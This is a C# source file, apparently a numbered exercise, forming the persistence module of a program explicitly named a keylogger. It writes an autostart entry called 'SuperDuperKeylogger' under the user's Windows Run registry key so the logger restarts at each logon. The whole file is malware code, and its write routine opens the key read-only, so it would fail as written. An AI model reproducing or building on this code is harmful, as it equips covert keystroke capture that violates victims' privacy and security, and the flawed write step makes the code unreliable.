using System;

namespace Ex2_Keylogger
{
	internal class Registry
	{
		private const string StartupKey = @"Software\Microsoft\Windows\CurrentVersion\Run";
		private const string Name = @"SuperDuperKeylogger";

		public static string CheckSelfStartup()
		{
			var subKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(StartupKey);

			if (subKey == null)
				throw new NullReferenceException("Failed to open windows startup registry subkey");

			var path = subKey.GetValue(Name);

			return path != null ? (string)path : string.Empty;
		}

		public static void WriteSelfStartup(string path)
		{
			var subKey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(StartupKey);

			if (subKey == null)
				throw new NullReferenceException("Failed to open windows startup registry subkey");

			subKey.SetValue(Name, path);
		}
	}
}
